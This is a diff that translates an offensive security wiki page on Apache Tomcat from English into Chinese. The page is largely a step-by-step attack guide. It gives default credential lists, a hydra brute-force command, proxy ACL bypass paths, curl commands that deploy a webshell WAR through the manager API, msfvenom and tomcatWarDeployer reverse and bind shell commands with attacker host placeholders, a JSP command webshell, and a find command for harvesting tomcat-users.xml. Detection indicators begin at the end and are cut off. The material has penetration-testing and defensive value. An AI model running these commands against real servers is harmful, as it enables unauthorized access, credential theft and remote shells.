@@ -9,9 +9,9 @@ impact:
   - 权限提升
 risk_level: 高
 prerequisites:
-  - HTTP Protocol Basics
-  - Java Web Application Structure (WAR, Servlet, JSP)
-  - Basic Authentication
+  - HTTP 协议基础
+  - Java Web 应用结构（WAR、Servlet、JSP）
+  - HTTP Basic 认证
 related_techniques:
   - file-upload
   - waf-bypass
@@ -29,278 +29,278 @@ tools:
 
 # Tomcat — Apache Tomcat Attack Surface — Tomcat 攻击面分析
 
-> 关联文档：[File Upload](../../Files/File%20Upload/README.md) · [WAF Bypass](../../Proxies/Proxy%20&%20WAF%20Protections%20Bypass/README.md) · [Parameter Pollution](../../Other%20Helpful%20Vulnerabilities/Parameter%20Pollution/README.md) · [Java Deserialization](../../../User%20input/Structured%20objects/Deserialization/README.md) · [JBoss](../JBoss/README.md)
+> 关联文档：[File Upload](../../Files/File%20Upload/README.md) · [WAF Bypass](../../Proxies/Proxy%20&%20WAF%20Protections%20Bypass/README.md) · [Parameter Pollution](../../Other%20Helpful%20Vulnerabilities/Parameter%20Pollution/README.md) · [Java Deserialization](../../User%20input/Structured%20objects/Deserialization/README.md) · [JBoss](../JBoss/README.md)
 
 ---
 
 ### 知识路径
 
 ```
-Tomcat Security (this document)
-  ├── Prerequisite: Java Web Applications — WAR structure, Servlet API, JSP
-  ├── Prerequisite: HTTP Basic Authentication
-  ├── Next: AJP Protocol Attacks (Ghostcat CVE-2020-1938)
-  ├── Next: Java Deserialization in Tomcat context
-  │   └── See: User input/Structured objects/Deserialization
-  ├── Related: File Upload — Axis2 SOAP → Tomcat webroot JSP drop
-  │   └── See: Files/File Upload
-  ├── Related: WAF Bypass — Tomcat path parsing differences
-  │   └── See: Proxies/Proxy & WAF Protections Bypass
-  ├── Related: Parameter Pollution — Spring MVC + Tomcat comma concatenation
-  │   └── See: Other Helpful Vulnerabilities/Parameter Pollution
-  └── Related: JBoss — same Java app server category
-      └── See: Web Servers & Middleware/JBoss
+Tomcat Security（本文档）
+  ├── 前置知识：Java Web 应用 — WAR 结构、Servlet API、JSP
+  ├── 前置知识：HTTP Basic 认证
+  ├── 进阶：AJP 协议攻击（Ghostcat CVE-2020-1938）
+  ├── 进阶：Tomcat 上下文中的 Java 反序列化
+  │   └── 参见：User input/Structured objects/Deserialization
+  ├── 关联：File Upload — Axis2 SOAP → Tomcat webroot JSP 植入
+  │   └── 参见：Files/File Upload
+  ├── 关联：WAF Bypass — Tomcat 路径解析差异
+  │   └── 参见：Proxies/Proxy & WAF Protections Bypass
+  ├── 关联：Parameter Pollution — Spring MVC + Tomcat 逗号拼接
+  │   └── 参见：Other Helpful Vulnerabilities/Parameter Pollution
+  └── 关联：JBoss — 同类 Java 应用服务器
+      └── 参见：Web Servers & Middleware/JBoss
 ```
 
 ---
 
-# 0x01 Tomcat Attack Surface — Principles & Classification
+# 0x01 Tomcat 攻击面 — 原理与分类
 
-## 1.1 Tomcat Architecture Overview
+## 1.1 Tomcat 架构概览
 
-Apache Tomcat is an open-source Java Servlet container implementing Jakarta Servlet, Jakarta Server Pages (JSP), Jakarta Expression Language, and Jakarta WebSocket specifications. Its attack surface spans:
+Apache Tomcat 是一个开源的 Java Servlet 容器，实现了 Jakarta Servlet、Jakarta Server Pages（JSP）、Jakarta Expression Language 和 Jakarta WebSocket 规范。其攻击面覆盖多个层次：
 
-- **HTTP Connector** — Listens on port 8080 by default (Coyote HTTP/1.1). Also supports NIO, NIO2, APR/native. Parsing differences between connectors create attack surface (e.g., path normalization bypasses).
-- **AJP Connector** — Binary protocol on port 8009 between reverse proxy (Apache httpd / Nginx) and Tomcat. Historically vulnerable: CVE-2020-1938 (Ghostcat) allows unauthenticated file read/RCE via arbitrary AJP packet injection.
-- **Manager Applications** — `/manager/html` (GUI), `/manager/text` (API), `/host-manager/html`. Protected by Basic auth; credentials in `tomcat-users.xml`. Successful login → WAR deployment → RCE.
-- **Default Applications** — `/examples`, `/docs`, `/host-manager`, `/manager` shipped in default install. `/examples` contains information-leaking servlets and XSS-vulnerable JSP pages.
-- **Servlet Engine (Catalina)** — Core servlet container. URL parsing logic in `org.apache.catalina` is the source of path traversal bypasses (`/..;/`, `;param=value`).
-- **Deployment Pipeline** — Hot-deployment of WAR files to `webapps/` directory. A writable `webapps/` (via PUT method or filesystem access) enables direct webshell deployment.
+- **HTTP Connector** — 默认监听 **8080** 端口（Coyote HTTP/1.1）。同时支持 NIO、NIO2、APR/native。不同 Connector 之间的解析差异创造攻击面（如路径规范化绕过）。
+- **AJP Connector** — 反向代理（Apache httpd / Nginx）与 Tomcat 之间的二进制协议，端口 **8009**。历史漏洞：CVE-2020-1938（Ghostcat）允许通过任意 AJP 包注入实现无需认证的文件读取/RCE。
+- **Manager 应用** — `/manager/html`（GUI）、`/manager/text`（API）、`/host-manager/html`。受 Basic 认证保护；凭据存储在 `tomcat-users.xml` 中。登录成功 → WAR 部署 → RCE。
+- **默认应用** — `/examples`、`/docs`、`/host-manager`、`/manager` 随默认安装提供。`/examples` 包含信息泄露的 Servlet 和存在 XSS 漏洞的 JSP 页面。
+- **Servlet 引擎（Catalina）** — 核心 Servlet 容器。`org.apache.catalina` 中的 URL 解析逻辑是路径遍历绕过（`/..;/`、`;param=value`）的源头。
+- **部署管道** — WAR 文件热部署到 `webapps/` 目录。可写的 `webapps/`（通过 PUT 方法或文件系统访问）可直接部署 webshell。
 
-Default ports:
+默认端口：
 
-| Port | Service |
-|------|---------|
-| 8080 | HTTP Connector (default) |
+| 端口 | 服务 |
+|------|------|
+| 8080 | HTTP Connector（默认） |
 | 8443 | HTTPS Connector |
 | 8009 | AJP Connector |
-| 8005 | Shutdown port (binds to 127.0.0.1) |
+| 8005 | Shutdown 端口（绑定 127.0.0.1） |
 
-## 1.2 Attack Surface Taxonomy
+## 1.2 攻击面分类
 
-| Category | Taxonomy | Examples |
-|----------|----------|----------|
-| Configuration Weakness | 配置缺陷 | Default credentials, /examples shipped in production, writable webapps, manager accessible without IP restriction |
-| Authentication/Authorization Bypass | 认证/授权绕过 | Path traversal bypass to manager (`/..;/manager/html`), double URL encoding (CVE-2007-1860 mod_jk) |
-| Information Disclosure | 信息泄露 | /examples servlets, /docs version disclosure, /manager/status, password in backtrace via auth.jsp |
-| Injection | 注入类 | WAR deployment (arbitrary code in JSP/servlet), path traversal in SOAP upload to Tomcat webroot |
-| Parsing Discrepancy | 协议解析差异 | `;` path delimiter confusion (Tomcat vs reverse proxy), `;param=value` path segment bypass |
+| 类别 | 分类名称 | 典型案例 |
+|------|---------|---------|
+| 配置缺陷 | 配置缺陷 | 默认凭据、生产环境保留 /examples、可写 webapps、Manager 无 IP 限制 |
+| 认证/授权绕过 | 认证/授权绕过 | 路径遍历绕过直达 Manager（`/..;/manager/html`）、双重 URL 编码（CVE-2007-1860 mod_jk） |
+| 信息泄露 | 信息泄露 | /examples Servlet、/docs 版本泄露、/manager/status、auth.jsp 回溯泄露密码 |
+| 注入类 | 注入类 | WAR 部署（JSP/Servlet 中执行任意代码）、SOAP 上传路径遍历到 Tomcat webroot |
+| 协议解析差异 | 协议解析差异 | `;` 路径分隔符混淆（Tomcat vs 反向代理）、`;param=value` 路径段绕过 |
 
-## 1.3 Version Landscape
+## 1.3 版本演变
 
-| Version | Key Changes |
-|---------|-------------|
-| Tomcat 4.x – 6.x | Username enumeration possible via `tomcat_enum`. CVE-2007-1860 (double URL encoding in mod_jk). /examples shipped by default. |
-| Tomcat 7.x | /examples still present. Path traversal `/..;/` bypass effective against reverse proxy mappings. `manager-gui` role introduced. |
-| Tomcat 8.x – 9.x | AJP enabled by default until 9.0.31. CVE-2020-1938 (Ghostcat) — arbitrary file read via AJP. AJP disabled by default since 9.0.31. |
-| Tomcat 10.x | Jakarta EE 9 migration (`javax.*` → `jakarta.*`). AJP disabled by default. Default apps still shipped in some distributions. |
+| 版本 | 关键变化 |
+|------|---------|
+| Tomcat 4.x – 6.x | 可通过 `tomcat_enum` 枚举用户名。CVE-2007-1860（mod_jk 双重 URL 编码）。默认提供 /examples。 |
+| Tomcat 7.x | /examples 仍存在。路径遍历 `/..;/` 绕过对反向代理映射有效。引入 `manager-gui` 角色。 |
+| Tomcat 8.x – 9.x | 9.0.31 前 AJP 默认启用。CVE-2020-1938（Ghostcat）— 通过 AJP 任意文件读取。9.0.31 起 AJP 默认禁用。 |
+| Tomcat 10.x | Jakarta EE 9 迁移（`javax.*` → `jakarta.*`）。AJP 默认禁用。部分发行版仍提供默认应用。 |
 
 ---
 
-# 0x02 Reconnaissance & Enumeration
+# 0x02 侦察与枚举
 
-## 2.1 Discovery
+## 2.1 发现
 
-Tomcat typically runs on **port 8080** (HTTP) and **8443** (HTTPS). A common Tomcat error page confirms the server identity:
+Tomcat 通常运行在 **8080** 端口（HTTP）和 **8443** 端口（HTTPS）。特征性的 Tomcat 错误页面可确认服务器身份：
 
-[图片: Tomcat 404 error page — Tesseract extracted: "TTP Status 404 — Not Found |Apache Tomca"]
+[图片: Tomcat 404 错误页面 — Tesseract 提取："TTP Status 404 — Not Found |Apache Tomca"]
 
-## 2.2 Version Identification
+## 2.2 版本识别
 
 ```bash
-# Grep the /docs index page for version in <title>
+# 从 /docs 索引页的 <title> 中提取版本
 curl -s http://tomcat-site.local:8080/docs/ | grep Tomcat
 ```
 
-The version string appears in the HTML `<title>` tag of the documentation index.
+版本字符串出现在文档索引页的 HTML `<title>` 标签中。
 
-The `/manager/status` page (when accessible) displays both **Tomcat version** and **OS version**, aiding vulnerability correlation.
+`/manager/status` 页面（可访问时）同时显示 **Tomcat 版本** 和 **操作系统版本**，有助于漏洞关联。
 
-## 2.3 Manager Files Location
+## 2.3 Manager 文件位置
 
-`/manager` and `/host-manager` directory names may be altered. A brute-force search is recommended to locate these pages:
+`/manager` 和 `/host-manager` 目录名可能被修改。建议通过爆破搜索定位这些页面：
 
 ```bash
-# Common paths to check
+# 常见的检查路径
 /manager/html
 /manager/text
 /manager/status
 /host-manager/html
 /admin
-/manager/html/../;/manager/html  # path traversal bypass
+/manager/html/../;/manager/html  # 路径遍历绕过
 ```
 
-## 2.4 Username Enumeration (Tomcat < 6)
+## 2.4 用户名枚举（Tomcat < 6）
 
-For Tomcat versions older than 6, username enumeration is possible:
+对于 Tomcat 6 之前的版本，可以枚举用户名：
 
 ```bash
 msf> use auxiliary/scanner/http/tomcat_enum
 ```
 
-> **Limitation:** This technique is effective only against Tomcat versions prior to 6. Newer versions do not leak username validity in authentication responses.
+> **限制**：此技术仅对 Tomcat 6 之前的版本有效。新版本不会在认证响应中泄露用户名有效性。
 
-## 2.5 Default Credentials
+## 2.5 默认凭据
 
-The `/manager/html` directory is protected by HTTP Basic Authentication. Common default credentials:
+`/manager/html` 目录受 HTTP Basic 认证保护。常见默认凭据：
 
 ```
 admin:admin
 tomcat:tomcat
-admin:<blank>
+admin:<留空>
 admin:s3cr3t
 tomcat:s3cr3t
 admin:tomcat
 ```
 
-Automated credential testing:
+自动化凭据测试：
 
 ```bash
 msf> use auxiliary/scanner/http/tomcat_mgr_login
 ```
 
-## 2.6 Brute Force Attack
+## 2.6 爆破攻击
 
 ```bash
 hydra -L users.txt -P /usr/share/seclists/Passwords/darkweb2017-top1000.txt -f 10.10.10.64 http-get /manager/html
 ```
 
-Metasploit equivalent provides session-aware credential testing with configurable delay and stop-on-success behavior.
+Metasploit 等效模块提供会话感知的凭据测试，支持可配置延迟和成功即停行为。
 
 ---
 
-# 0x03 Information Disclosure & Access Bypass
+# 0x03 信息泄露与访问绕过
 
-## 3.1 Password Backtrace Disclosure
+## 3.1 密码回溯泄露
 
-Accessing `/auth.jsp` in certain configurations may reveal the password in a Java exception stack trace. This occurs when the authentication mechanism throws an unhandled exception that includes sensitive parameters in the backtrace output.
+在某些配置下访问 `/auth.jsp` 可能在 Java 异常堆栈回溯中泄露密码。这发生在认证机制抛出未处理异常，将敏感参数包含在回溯输出中时。
 
-> **Condition:** Requires `auth.jsp` to be present and the application to be configured with debug-level error output. Not present in default Tomcat installations — typically found in custom web applications deployed on Tomcat.
+> **条件**：需要 `auth.jsp` 存在且应用配置了调试级别的错误输出。默认 Tomcat 安装中不存在 — 通常出现在部署在 Tomcat 上的自定义 Web 应用中。
 
-## 3.2 Double URL Encoding Path Traversal (CVE-2007-1860)
+## 3.2 双重 URL 编码路径遍历（CVE-2007-1860）
 
-### 3.2.1 Mechanism
+### 3.2.1 机制
 
-The `mod_jk` connector (Apache httpd ↔ Tomcat) performs URL decoding before forwarding requests. Double-encoding a path traversal sequence causes `mod_jk` to decode once → pass the traversal, then Tomcat decodes again → processes the traversed path.
+`mod_jk` 连接器（Apache httpd ↔ Tomcat）在转发请求前进行 URL 解码。对路径遍历序列进行双重编码导致 `mod_jk` 解码一次 → 放行遍历，然后 Tomcat 再次解码 → 处理已遍历的路径。
 
-### 3.2.2 Exploitation
+### 3.2.2 利用
 
 ```
-# Double-encoded traversal to reach manager without authentication
+# 双重编码遍历直达 Manager 且无需认证
 pathTomcat/%252E%252E/manager/html
 ```
 
-Decoding chain: `%252E%252E` → `%2E%2E` → `..`
+解码链：`%252E%252E` → `%2E%2E` → `..`
 
-> **Affected:** mod_jk connector in Tomcat 4.x – 6.x era. Requires `mod_jk` to be the front-end connector.
+> **受影响**：Tomcat 4.x – 6.x 时代的 mod_jk 连接器。需要 `mod_jk` 作为前端连接器。
 
-## 3.3 /examples Directory Information Disclosure & XSS
+## 3.3 /examples 目录信息泄露与 XSS
 
-### 3.3.1 Mechanism
+### 3.3.1 机制
 
-Apache Tomcat versions 4.x through 7.x include example scripts in the `/examples` directory that expose internal application state and are susceptible to Cross-Site Scripting (XSS). These are shipped in the default installation and often left in production.
+Apache Tomcat 4.x 至 7.x 在 `/examples` 目录中包含示例脚本，这些脚本暴露内部应用状态且容易受到 Cross-Site Scripting（XSS）攻击。它们在默认安装中提供，且常被遗留在生产环境中。
 
-### 3.3.2 Exposed Endpoints
+### 3.3.2 暴露的端点
 
-JSP examples (information-leaking):
-
-```
-/examples/jsp/num/numguess.jsp       — Session state disclosure
-/examples/jsp/dates/date.jsp         — Server date/time
-/examples/jsp/snp/snoop.jsp          — Request/header/session dump (most dangerous)
-/examples/jsp/error/error.html       — Error page example
-/examples/jsp/sessions/carts.html    — Session tracking demo
-/examples/jsp/checkbox/check.html    — Form processing example
-/examples/jsp/colors/colors.html     — Color preferences demo
-/examples/jsp/cal/login.html         — Calendar login example
-/examples/jsp/include/include.jsp    — Server-side include example
-/examples/jsp/forward/forward.jsp    — Request forwarding example
-/examples/jsp/plugin/plugin.jsp      — Applet plugin example
-/examples/jsp/jsptoserv/jsptoservlet.jsp — JSP-to-Servlet lifecycle info
-/examples/jsp/simpletag/foo.jsp      — Custom tag example
-/examples/jsp/mail/sendmail.jsp      — SMTP mail sending (abuse potential)
-```
-
-Servlet examples (request/environment introspection):
+JSP 示例（信息泄露型）：
 
 ```
-/examples/servlet/HelloWorldExample      — Basic servlet
-/examples/servlet/RequestInfoExample     — Request parameter dump
-/examples/servlet/RequestHeaderExample   — HTTP header reflection
-/examples/servlet/RequestParamExample    — GET/POST parameter echo
-/examples/servlet/CookieExample          — Cookie set/get
-/examples/servlet/JndiServlet            — JNDI context listing
-/examples/servlet/SessionExample         — Session attribute display
+/examples/jsp/num/numguess.jsp       — 会话状态泄露
+/examples/jsp/dates/date.jsp         — 服务器日期/时间
+/examples/jsp/snp/snoop.jsp          — 请求/头/会话转储（最危险）
+/examples/jsp/error/error.html       — 错误页面示例
+/examples/jsp/sessions/carts.html    — 会话追踪演示
+/examples/jsp/checkbox/check.html    — 表单处理示例
+/examples/jsp/colors/colors.html     — 颜色偏好演示
+/examples/jsp/cal/login.html         — 日历登录示例
+/examples/jsp/include/include.jsp    — 服务端包含示例
+/examples/jsp/forward/forward.jsp    — 请求转发示例
+/examples/jsp/plugin/plugin.jsp      — Applet 插件示例
+/examples/jsp/jsptoserv/jsptoservlet.jsp — JSP-to-Servlet 生命周期信息
+/examples/jsp/simpletag/foo.jsp      — 自定义标签示例
+/examples/jsp/mail/sendmail.jsp      — SMTP 邮件发送（可滥用）
 ```
 
-Tomcat documentation sample:
+Servlet 示例（请求/环境自省）：
+
+```
+/examples/servlet/HelloWorldExample      — 基础 Servlet
+/examples/servlet/RequestInfoExample     — 请求参数转储
+/examples/servlet/RequestHeaderExample   — HTTP 头反射
+/examples/servlet/RequestParamExample    — GET/POST 参数回显
+/examples/servlet/CookieExample          — Cookie 设置/获取
+/examples/servlet/JndiServlet            — JNDI 上下文列表
+/examples/servlet/SessionExample         — 会话属性展示
+```
+
+Tomcat 文档示例：
 
 ```
 /tomcat-docs/appdev/sample/web/hello.jsp
 ```
 
-> **Reference:** [Rapid7 — Apache Tomcat Example Leaks](https://www.rapid7.com/db/vulnerabilities/apache-tomcat-example-leaks/)
+> **参考资料**：[Rapid7 — Apache Tomcat Example Leaks](https://www.rapid7.com/db/vulnerabilities/apache-tomcat-example-leaks/)
 
-## 3.4 Path Traversal Bypass via Path Delimiter Confusion
+## 3.4 路径分隔符混淆导致的路径遍历绕过
 
-### 3.4.1 `/..;/` Traversal
+### 3.4.1 `/..;/` 遍历
 
-In [vulnerable Tomcat + reverse proxy configurations](https://www.acunetix.com/vulnerabilities/web/tomcat-path-traversal-via-reverse-proxy-mapping/), the path segment `/..;/` is interpreted differently by the reverse proxy and Tomcat:
+在[存在漏洞的 Tomcat + 反向代理配置](https://www.acunetix.com/vulnerabilities/web/tomcat-path-traversal-via-reverse-proxy-mapping/)中，路径段 `/..;/` 被反向代理和 Tomcat 以不同方式解释：
 
 ```
-# Reverse proxy sees: /lalala/..;/manager/html → normalizes to /manager/html (blocks it)
-# But forwards literal path to Tomcat
-# Tomcat's Catalina servlet engine treats ; as path parameter delimiter
-# → /lalala/.. is the path, ;/manager/html is a parameter
-# → Resolves to /manager/html — bypasses proxy ACL
+# 反向代理看到：/lalala/..;/manager/html → 规范化为 /manager/html（拦截）
+# 但将字面路径转发给 Tomcat
+# Tomcat 的 Catalina Servlet 引擎将 ; 视为路径参数分隔符
+# → /lalala/.. 是路径，;/manager/html 是参数
+# → 解析为 /manager/html — 绕过代理 ACL
 www.vulnerable.com/lalala/..;/manager/html
 ```
 
-### 3.4.2 `;param=value` Segment Bypass
+### 3.4.2 `;param=value` 段绕过
 
-An alternative form using a path parameter in the root segment:
+在根段中使用路径参数的替代形式：
 
 ```
 http://www.vulnerable.com/;param=value/manager/html
 ```
 
-Tomcat's `org.apache.catalina.connector.CoyoteAdapter` parses `;param=value` as a path parameter attached to the root `/`, preserving access to the intended path after the semicolon segment. This bypasses reverse proxy rules that match on the literal path prefix.
+Tomcat 的 `org.apache.catalina.connector.CoyoteAdapter` 将 `;param=value` 解析为附加到根 `/` 的路径参数，保留对分号段后目标路径的访问。这绕过了匹配字面路径前缀的反向代理规则。
 
-This same parsing behavior is why Tomcat appears in [WAF Bypass](../../Proxies/Proxy%20&%20WAF%20Protections%20Bypass/README.md) contexts — the `;` acts as a path delimiter in Tomcat but not in front-end proxies, creating filter bypass opportunities. The [Parameter Pollution](../../Other%20Helpful%20Vulnerabilities/Parameter%20Pollution/README.md) behavior of Spring MVC + Tomcat (comma-concatenation of duplicate parameters) compounds this in many deployments.
+同样的解析行为也是 Tomcat 出现在 [WAF Bypass](../../Proxies/Proxy%20&%20WAF%20Protections%20Bypass/README.md) 上下文中的原因 — `;` 在 Tomcat 中作为路径分隔符但在前端代理中不是，创造了过滤器绕过机会。Spring MVC + Tomcat 的 [Parameter Pollution](../../Other%20Helpful%20Vulnerabilities/Parameter%20Pollution/README.md) 行为（重复参数的逗号拼接）在许多部署中加剧了这一问题。
 
 ---
 
-# 0x04 Remote Code Execution
+# 0x04 远程代码执行
 
-## 4.1 WAR File Deployment via Manager
+## 4.1 通过 Manager 部署 WAR 文件
 
-### 4.1.1 Mechanism
+### 4.1.1 机制
 
-The Tomcat Web Application Manager allows authenticated users to upload and deploy WAR (Web Application Archive) files. A WAR containing a JSP webshell provides immediate command execution under the Tomcat process identity.
+Tomcat Web Application Manager 允许已认证用户上传和部署 WAR（Web Application Archive）文件。包含 JSP webshell 的 WAR 可提供以 Tomcat 进程身份执行的即时命令执行。
 
-### 4.1.2 Prerequisites
+### 4.1.2 前提条件
 
-- Valid credentials for a user with one of these roles: **manager-gui**, **manager-script**, **admin**
-- Roles are defined in `tomcat-users.xml` (see §5.1)
-- The manager application must be accessible (not IP-restricted or removed)
+- 具有以下角色之一的有效凭据：**manager-gui**、**manager-script**、**admin**
+- 角色在 `tomcat-users.xml` 中定义（参见 §5.1）
+- Manager 应用必须可访问（未被 IP 限制或移除）
 
-### 4.1.3 Deploy via API (manager/text)
+### 4.1.3 通过 API 部署（manager/text）
 
 ```bash
-# Deploy a WAR under a given context path
+# 在指定上下文路径下部署 WAR
 curl --upload-file monshell.war -u 'tomcat:password' "http://localhost:8080/manager/text/deploy?path=/monshell"
 
-# Undeploy / cleanup
+# 取消部署 / 清理
 curl "http://tomcat:password@localhost:8080/manager/text/undeploy?path=/monshell"
 ```
 
-### 4.1.4 Limitations
+### 4.1.4 限制
 
-- `tomcat6-admin` (Debian) or `tomcat6-admin-webapps` (RHEL) must be installed for manager access
-- User must have appropriate role (`manager-gui` for HTML interface, `manager-script` for text API). Roles are defined in `tomcat-users.xml` — path varies by distribution and version. See [§5.1.1](#511-file-discovery) for the full path table.
-- Some Tomcat packaging (e.g., minimal Docker images) strip the manager application entirely
+- 必须安装 `tomcat6-admin`（Debian）或 `tomcat6-admin-webapps`（RHEL）才能使用 Manager
+- 用户必须拥有适当角色（HTML 界面需 `manager-gui`，文本 API 需 `manager-script`）。角色在 `tomcat-users.xml` 中定义 — 文件路径因发行版和版本而异。详见 [§5.1.1](#511-file-discovery) 中的完整路径表。
+- 某些 Tomcat 打包方式（如最小化 Docker 镜像）会完全移除 Manager 应用
 
-## 4.2 Metasploit Module
+## 4.2 Metasploit 模块
 
 ```bash
 use exploit/multi/http/tomcat_mgr_upload
@@ -311,52 +311,52 @@ msf exploit(multi/http/tomcat_mgr_upload) > set httppassword <password>
 msf exploit(multi/http/tomcat_mgr_upload) > exploit
 ```
 
-This module automates WAR generation, deployment, payload execution, and cleanup.
+此模块自动化 WAR 生成、部署、payload 执行和清理。
 
-## 4.3 MSFVenom JSP Reverse Shell
+## 4.3 MSFVenom JSP 反向 Shell
 
 ```bash
-# Generate WAR containing JSP reverse shell
+# 生成包含 JSP 反向 shell 的 WAR
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST_IP> LPORT=<LPORT> -f war -o revshell.war
 ```
 
-Upload `revshell.war` via the manager GUI or API, then trigger the payload by accessing `http://target:8080/revshell/`.
+通过 Manager GUI 或 API 上传 `revshell.war`，然后通过访问 `http://target:8080/revshell/` 触发 payload。
 
 ## 4.4 tomcatWarDeployer.py
 
-[tomcatWarDeployer](https://github.com/mgeeky/tomcatWarDeployer) is a dedicated Python script for WAR deployment with built-in reverse and bind shell payloads:
+[tomcatWarDeployer](https://github.com/mgeeky/tomcatWarDeployer) 是一个专用的 Python 脚本，内置反向和绑定 Shell payload 进行 WAR 部署：
 
 ```bash
 git clone https://github.com/mgeeky/tomcatWarDeployer.git
 ```
 
-**Reverse shell:**
+**反向 Shell：**
 
 ```bash
 ./tomcatWarDeployer.py -U <username> -P <password> -H <ATTACKER_IP> -p <ATTACKER_PORT> <VICTIM_IP>:<VICTIM_PORT>/manager/html/
 ```
 
-**Bind shell:**
+**绑定 Shell：**
 
 ```bash
 ./tomcatWarDeployer.py -U <username> -P <password> -p <bind_port> <victim_IP>:<victim_PORT>/manager/html/
 ```
 
-> **Note:** Some older Java/OS combinations (particularly legacy Sun JVM versions) may fail to execute the payload properly.
+> **注意**：某些旧版 Java/OS 组合（特别是旧版 Sun JVM）可能无法正确执行 payload。
 
-## 4.5 clusterd Automated Exploitation
+## 4.5 clusterd 自动化利用
 
-[clusterd](https://github.com/hatRiot/clusterd) provides automated exploitation for multiple application servers including Tomcat:
+[clusterd](https://github.com/hatRiot/clusterd) 提供针对包括 Tomcat 在内的多种应用服务器的自动化利用：
 
 ```bash
 clusterd.py -i 192.168.1.105 -a tomcat -v 5.5 --gen-payload 192.168.1.6:4444 --deploy shell.war --invoke --rand-payload -o windows
 ```
 
-## 4.6 Manual JSP Web Shell Deployment
+## 4.6 手动 JSP Web Shell 部署
 
-### 4.6.1 Basic Command Shell (index.jsp)
+### 4.6.1 基础命令 Shell（index.jsp）
 
-Create `index.jsp` with the following content (from [tennc/fuzzdb webshell collection](https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp)):
+创建包含以下内容的 `index.jsp`（来自 [tennc/fuzzdb webshell 合集](https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp)）：
 
 ```java
 <FORM METHOD=GET ACTION='index.jsp'>
@@ -380,51 +380,51 @@ InputStreamReader(p.getInputStream()));
 <pre><%=output %></pre>
 ```
 
-Package and deploy:
+打包并部署：
 
 ```bash
 mkdir webshell
 cp index.jsp webshell
 cd webshell
 jar -cvf ../webshell.war *
-# webshell.war is created — upload via manager
+# webshell.war 已创建 — 通过 Manager 上传
 ```
 
-### 4.6.2 Quick WAR from Remote Shell
+### 4.6.2 从远程 Shell 快速创建 WAR
 
 ```bash
 wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
 zip -r backup.war cmd.jsp
-# Upload to manager GUI → application deployed at /backup
-# Access shell at: http://tomcat-site.local:8180/backup/cmd.jsp
+# 上传到 Manager GUI → 应用部署在 /backup
+# 访问 shell：http://tomcat-site.local:8180/backup/cmd.jsp
 ```
 
-### 4.6.3 Alternative: filebrowser.war
+### 4.6.3 替代方案：filebrowser.war
 
-Install the [vonLoesch filebrowser](http://vonloesch.de/filebrowser.html) WAR for a full-featured file management, upload, download, and command execution interface through the Tomcat manager.
+安装 [vonLoesch filebrowser](http://vonloesch.de/filebrowser.html) WAR 以获得功能完整的文件管理、上传、下载和命令执行界面。
 
 ---
 
-# 0x05 Post-Exploitation & Credential Harvesting
+# 0x05 后渗透与凭据收集
 
-## 5.1 tomcat-users.xml Location & Structure
+## 5.1 tomcat-users.xml 位置与结构
 
-### 5.1.1 File Discovery
+### 5.1.1 文件发现
 
 ```bash
 find / -name tomcat-users.xml 2>/dev/null
 ```
 
-Common locations:
+常见位置：
 
-| Distribution | Path |
-|-------------|------|
-| Debian/Ubuntu (Tomcat 9) | `/usr/share/tomcat9/etc/tomcat-users.xml` |
+| 发行版 | 路径 |
+|--------|------|
+| Debian/Ubuntu（Tomcat 9） | `/usr/share/tomcat9/etc/tomcat-users.xml` |
 | RHEL/CentOS | `/etc/tomcat/tomcat-users.xml` |
-| Manual/Docker | `$CATALINA_HOME/conf/tomcat-users.xml` |
+| 手动安装/Docker | `$CATALINA_HOME/conf/tomcat-users.xml` |
 | Windows | `C:\Program Files\Apache Software Foundation\Tomcat <ver>\conf\tomcat-users.xml` |
 
-### 5.1.2 File Structure
+### 5.1.2 文件结构
 
 ```xml
 [...]
@@ -446,85 +446,85 @@ Common locations:
 <user username="admin" password="admin" roles="manager-gui,admin-gui" />
 ```
 
-### 5.1.3 Role Privileges
+### 5.1.3 角色权限
 
-| Role | Access |
-|------|--------|
-| `manager-gui` | HTML GUI + status pages |
-| `manager-script` | HTTP text API + status pages (minimal for programmatic deployment) |
-| `manager-jmx` | JMX proxy + status pages |
-| `manager-status` | Status pages only (read-only) |
-| `admin-gui` | `/host-manager/html` — virtual host management |
+| 角色 | 权限范围 |
+|------|---------|
+| `manager-gui` | HTML GUI + 状态页面 |
+| `manager-script` | HTTP 文本 API + 状态页面（程序化部署所需的最小权限） |
+| `manager-jmx` | JMX 代理 + 状态页面 |
+| `manager-status` | 仅状态页面（只读） |
+| `admin-gui` | `/host-manager/html` — 虚拟主机管理 |
 
-> **Post-exploitation value:** Harvested `tomcat-users.xml` credentials may be reused across environments. The `manager-script` role alone is sufficient for WAR deployment via the `/manager/text` API — no GUI access required.
+> **后渗透价值**：获取的 `tomcat-users.xml` 凭据可能跨环境复用。仅 `manager-script` 角色就足以通过 `/manager/text` API 部署 WAR — 无需 GUI 访问。
 
 ---
 
-# 0x06 Defense, Hardening & Tools
+# 0x06 防御、加固与工具
 
-## 6.1 Detection Methodology
+## 6.1 检测方法论
 
-### 6.1.1 Network Telemetry
+### 6.1.1 网络流量检测
 
-| Indicator | Significance |
-|-----------|--------------|
-| `PUT` or `POST` to `/manager/text/deploy` | WAR deployment via API |
-| Requests to `/examples/servlet/`, `/examples/jsp/snp/snoop.jsp` | /examples information gathering |
-| Paths containing `%252E` (double-encoded `.`) | CVE-2007-1860 / mod_jk traversal |
-| Paths containing `/..;/` or `/;param=value/` segments | Path traversal bypass attempt |
-| `POST /manager/html/upload` with `.war` multipart | WAR upload via GUI |
-| Multiple `401` responses to `/manager/html` followed by `200` | Credential brute force |
+| 指标 | 意义 |
+|------|------|
+| 对 `/manager/text/deploy` 的 `PUT` 或 `POST` | 通过 API 部署 WAR |
+| 对 `/examples/servlet/`、`/examples/jsp/snp/snoop.jsp` 的请求 | /examples 信息收集 |
+| 路径包含 `%252E`（双重编码的 `.`） | CVE-2007-1860 / mod_jk 遍历 |
+| 路径包含 `/..;/` 或 `/;param=value/` 段 | 路径遍历绕过尝试 |
+| 带 `.war` multipart 的 `POST /manager/html/upload` | 通过 GUI 上传 WAR |
+| 对 `/manager/html` 多次 `401` 响应后出现 `200` | 凭据爆破 |
 
-### 6.1.2 Host-Based Indicators
+### 6.1.2 主机端检测
 
-| Indicator | Significance |
-|-----------|--------------|
